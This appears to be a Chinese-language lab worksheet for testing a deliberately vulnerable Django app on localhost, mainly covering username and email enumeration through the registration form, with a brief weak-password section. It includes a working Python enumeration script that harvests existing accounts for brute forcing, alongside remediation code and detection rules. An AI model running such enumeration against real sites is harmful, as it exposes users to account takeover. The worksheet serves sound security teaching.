# Phase 2：攻擊測試實戰記錄

> 目標：系統性地測試所有已實作的漏洞，記錄攻擊過程、思維邏輯、成功證據與防禦方案

---

## 📋 測試環境資訊

- **應用程式 URL**: http://localhost:8000
- **測試日期**: 2026-01-30
- **測試範圍**: 使用者認證與授權模組
- **測試工具**:
  - 瀏覽器 DevTools
  - Python Requests
  - cURL
  - Burp Suite (選用)

---

## 🎯 測試策略

### 測試原則

1. **白箱測試**：我們知道原始碼，了解漏洞的確切位置
2. **系統性測試**：按照漏洞類型逐一測試
3. **記錄導向**：每個測試都要記錄過程、結果、思維
4. **攻擊者視角**：假設我們是外部攻擊者，只能透過 HTTP 介面攻擊

### 測試順序

按照嚴重程度和學習曲線：

1. 使用者名稱/Email 列舉（資訊收集）
2. 弱密碼攻擊（簡單）
3. Timing Attack（需要測量）
4. CSRF on Logout（需要建立惡意頁面）
5. XSS 攻擊（需要理解 DOM）

---

## 漏洞 #1：使用者名稱列舉（User Enumeration）

### 📌 基本資訊

- **漏洞類型**: CWE-200 資訊洩漏
- **嚴重程度**: 🟡 中 (CVSS 5.3)
- **攻擊向量**: 網路（Remote）
- **所需權限**: 無（匿名使用者）
- **影響範圍**: 機密性
- **漏洞位置**:
  - `accounts/forms.py:59-62` (使用者名稱檢查)
  - `accounts/forms.py:72-75` (Email 檢查)
  - `accounts/views.py:register()` (註冊視圖)

### 🎯 攻擊目標

收集系統中存在的使用者名稱，為後續攻擊（如暴力破解）建立目標列表。

### 🧠 攻擊者思維

**問題分析**：

- 系統在註冊時會檢查使用者名稱是否已存在
- 如果已存在，會顯示明確的錯誤訊息
- 這讓攻擊者可以區分「帳號存在」和「帳號不存在」

**攻擊計畫**：

1. 準備常見使用者名稱列表（admin, root, user, test...）
2. 嘗試註冊每個使用者名稱
3. 分析回應訊息：
   - "此使用者名稱已被使用" → 帳號存在 ✅
   - 其他錯誤（如 Email 重複）→ 帳號存在 ✅
   - 註冊成功 → 帳號不存在 ❌

### 📝 測試步驟

#### 測試 1.1：手動測試（建立基準）

**步驟**：

1. 訪問 http://localhost:8000/accounts/register/
2. 先註冊一個測試帳號作為基準：
   - 使用者名稱: `testuser`
   - Email: `test@example.com`
   - 密碼: `123456`
   - 確認密碼: `123456`
3. 提交表單，應該註冊成功

**預期結果**：

- ✅ 註冊成功
- ✅ 重定向到登入頁面
- ✅ 顯示成功訊息

**實際結果**：

```
[記錄你的測試結果]
- 是否成功？
- 回應時間？
- 任何錯誤訊息？
```

---

#### 測試 1.2：驗證使用者列舉（已存在的帳號）

**步驟**：

1. 再次訪問註冊頁面
2. 嘗試註冊相同的使用者名稱：
   - 使用者名稱: `testuser` (已存在)
   - Email: `different@example.com` (不同的 Email)
   - 密碼: `123456`
   - 確認密碼: `123456`
3. 提交表單

**預期結果**：

- ❌ 註冊失敗
- ⚠️ 顯示「此使用者名稱已被使用」

**實際結果**：

```
[記錄你的測試結果]
- 錯誤訊息內容？
- 是否明確告知帳號已存在？
- 截圖或 HTML 回應？
```

**攻擊者學到什麼**：

- ✅ 確認 `testuser` 這個帳號存在於系統中
- ✅ 可以繼續用這個帳號進行暴力破解

---

#### 測試 1.3：Email 列舉

**步驟**：

1. 訪問註冊頁面
2. 嘗試註冊不同的使用者名稱，但相同的 Email：
   - 使用者名稱: `differentuser` (不同的使用者名稱)
   - Email: `test@example.com` (已存在)
   - 密碼: `123456`
   - 確認密碼: `123456`
3. 提交表單

**預期結果**：

- ❌ 註冊失敗
- ⚠️ 顯示「此 Email 已被使用」

**實際結果**：

```
[記錄你的測試結果]
```

---

#### 測試 1.4：自動化列舉攻擊（Python 腳本）

**攻擊腳本**：

建立檔案 `scripts/user_enumeration.py`：

```python
#!/usr/bin/env python3
"""
使用者名稱列舉攻擊腳本

用途：自動化測試常見的使用者名稱是否存在於系統中
"""

import requests
from bs4 import BeautifulSoup

# 目標 URL
TARGET_URL = "http://localhost:8000/accounts/register/"

# 常見使用者名稱列表
USERNAMES = [
    "admin",
    "administrator",
    "root",
    "user",
    "test",
    "guest",
    "demo",
    "webmaster",
    "support",
    "testuser",  # 我們知道這個存在
]

def get_csrf_token(session, url):
    """取得 CSRF token"""
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    return csrf_token['value'] if csrf_token else None

def test_username(session, username):
    """測試使用者名稱是否存在"""
    csrf_token = get_csrf_token(session, TARGET_URL)

    data = {
        'username': username,
        'email': f'{username}@test.com',
        'password': 'password123',
        'password_confirm': 'password123',
        'csrfmiddlewaretoken': csrf_token
    }

    response = session.post(TARGET_URL, data=data)

    # 分析回應
    if "此使用者名稱已被使用" in response.text:
        return True, "使用者名稱已存在"
    elif "此 Email 已被使用" in response.text:
        return True, "Email 已存在（使用者可能存在）"
    elif "註冊成功" in response.text or response.status_code == 302:
        return False, "使用者名稱不存在（已建立新帳號）"
    else:
        return None, "無法確定"

def main():
    """主函數"""
    session = requests.Session()

    print("=" * 60)
    print("使用者名稱列舉攻擊")
    print("=" * 60)
    print(f"目標: {TARGET_URL}")
    print(f"測試 {len(USERNAMES)} 個使用者名稱\n")

    found_users = []

    for username in USERNAMES:
        exists, message = test_username(session, username)

        if exists:
            print(f"[+] 找到使用者: {username:20s} - {message}")
            found_users.append(username)
        elif exists is False:
            print(f"[-] 不存在:     {username:20s}")
        else:
            print(f"[?] 無法確定:   {username:20s} - {message}")

    print("\n" + "=" * 60)
    print(f"總結: 找到 {len(found_users)} 個存在的使用者")
    print("=" * 60)

    if found_users:
        print("\n可用於暴力破解的帳號列表:")
        for user in found_users:
            print(f"  - {user}")

if __name__ == "__main__":
    main()
```

**執行步驟**：

```bash
# 1. 建立 scripts 目錄
mkdir -p scripts

# 2. 建立並儲存上述腳本

# 3. 安裝依賴
pip install requests beautifulsoup4

# 4. 執行腳本
python scripts/user_enumeration.py
```

**預期輸出**：

```
============================================================
使用者名稱列舉攻擊
============================================================
目標: http://localhost:8000/accounts/register/
測試 10 個使用者名稱

[+] 找到使用者: testuser             - 使用者名稱已存在
[-] 不存在:     admin
[-] 不存在:     root
...

============================================================
總結: 找到 1 個存在的使用者
============================================================

可用於暴力破解的帳號列表:
  - testuser
```

**實際執行結果**：

```
[在這裡貼上你執行腳本的實際輸出]
```

**攻擊成功證據**：

- [ ] 腳本成功執行
- [ ] 成功識別出已存在的使用者
- [ ] 輸出了可用於暴力破解的帳號列表

---

### 🛡️ 防禦方案

#### 根本原因分析

**為什麼會有這個漏洞？**

1. 開發者想提供友善的使用者體驗（告訴使用者為什麼註冊失敗）
2. 沒有意識到這會洩漏系統資訊
3. 沒有考慮到攻擊者會濫用這個特性

**漏洞的本質**：

- 系統的回應訊息過於詳細，區分了不同的失敗原因
- 攻擊者可以利用這個差異來收集資訊

#### 修復方案

**方案 1：統一錯誤訊息（推薦）**

```python
# accounts/forms.py

def clean_username(self):
    username = self.cleaned_data.get('username')

    if User.objects.filter(username=username).exists():
        # ❌ 舊的做法（會洩漏資訊）
        # raise forms.ValidationError('此使用者名稱已被使用')

        # ✅ 新的做法（統一訊息）
        raise forms.ValidationError('註冊失敗，請檢查輸入的資料')

    return username
```

**方案 2：延遲回應（進階）**

```python
import time
import random

def clean_username(self):
    username = self.cleaned_data.get('username')

    # 增加隨機延遲，讓攻擊者無法透過回應時間判斷
    time.sleep(random.uniform(0.1, 0.3))

    if User.objects.filter(username=username).exists():
        raise forms.ValidationError('註冊失敗，請檢查輸入的資料')

    return username
```

**方案 3：Rate Limiting（防止大量列舉）**

```python
# 使用 django-ratelimit
from django_ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST')
def register(request):
    # ... 原本的註冊邏輯
```

**方案 4：CAPTCHA（防止自動化）**

```python
# 使用 django-recaptcha
from django_recaptcha.fields import ReCaptchaField

class RegisterForm(forms.Form):
    # ... 其他欄位
    captcha = ReCaptchaField()
```

#### 檢測方法

**如何檢測這類攻擊？**

1. **日誌監控**：

   ```python
   # 記錄失敗的註冊嘗試
   if User.objects.filter(username=username).exists():
       logger.warning(f"Registration failed - username exists: {username} from IP: {request.META['REMOTE_ADDR']}")
   ```

2. **異常檢測**：
   - 短時間內來自同一 IP 的大量註冊請求
   - 相同 Email 但不同 username 的請求
   - 使用常見使用者名稱列表的嘗試

3. **WAF 規則**：
   ```
   # ModSecurity 規則範例
   SecRule REQUEST_URI "@streq /accounts/register/" \
       "chain,id:1001,phase:2,deny,log,msg:'Too many registration attempts'"
   SecRule &IP:registration_count "@gt 10"
   ```

---

### 📊 測試結果總結

**漏洞確認**：

- [ ] 已確認漏洞存在
- [ ] 手動測試成功
- [ ] 自動化腳本測試成功
- [ ] 已記錄攻擊證據

**學習收穫**：

```
[在這裡寫下你的學習心得]
- 理解了為什麼這是一個漏洞
- 知道如何檢測這類攻擊
- 了解了修復方案
- 其他想法...
```

**下一步**：

- [ ] 繼續測試下一個漏洞
- [ ] 或先實作修復方案並驗證

---

## 漏洞 #2：弱密碼驗證（Weak Password）

### 📌 基本資訊

- **漏洞類型**: CWE-521 弱密碼需求
- **嚴重程度**: 🟡 中 (CVSS 5.0)
- **攻擊向量**: 網路（Remote）
- **所需權限**: 無（匿名使用者）
- **影響範圍**: 認證機制
- **漏洞位置**:
  - `accounts/forms.py:86-88` (未檢查密碼強度)
  - `accounts/views.py:register()` (註冊視圖)

### 🎯 攻擊目標

註冊使用極弱密碼的帳號，使得帳號容易被暴力破解或字典攻擊。

### 🧠 攻擊者思維

**問題分析**：

- 系統沒有強制密碼複雜度要求
- 可以使用極短或極簡單的密碼
- 這讓後續的暴力破解變得容易

**攻擊計畫**：

1. 嘗試各種弱密碼（長度、複雜度）
2. 記錄系統接受的最弱密碼
3. 建立弱密碼帳號供後續測試

### 📝 測試步驟

#### 測試 2.1：最短密碼測試

**步驟**：

```
[請你填寫測試步驟]
```

**實際結果**：

```
[記錄測試結果]
```

#### 測試 2.2：常見弱密碼測試

**測試列表**：

- `123456`
- `password`
- `admin`
- `111111`
- `qwerty`
- `abc123`

**實際結果**：

```
[記錄哪些密碼被接受]
```

---

### 🛡️ 防禦方案

```python
# Django 內建的密碼驗證器
AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
        'OPTIONS': {'min_length': 8}
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]
```

---

## 漏洞 #3：Timing Attack

[待測試 - 請按照相同格式記錄]

---

## 漏洞 #4：CSRF on Logout

[待測試 - 請按照相同格式記錄]

---

## 漏洞 #5：XSS (Stored)

[待測試 - 請按照相同格式記錄]

---

## 📈 總體測試進度

- [ ] 漏洞 #1: 使用者名稱列舉
- [ ] 漏洞 #2: 弱密碼驗證
- [ ] 漏洞 #3: Timing Attack
- [ ] 漏洞 #4: CSRF on Logout
- [ ] 漏洞 #5: XSS (Stored)
- [ ] 漏洞 #6: 無 Rate Limiting
- [ ] 漏洞 #7: Open Redirect

---

## 🎓 學習總結

### 攻擊者視角的收穫

```
[在完成所有測試後填寫]
```

### 防禦者視角的收穫

```
[在完成所有測試後填寫]
```

### 最重要的三個學習

```
1.
2.
3.
```
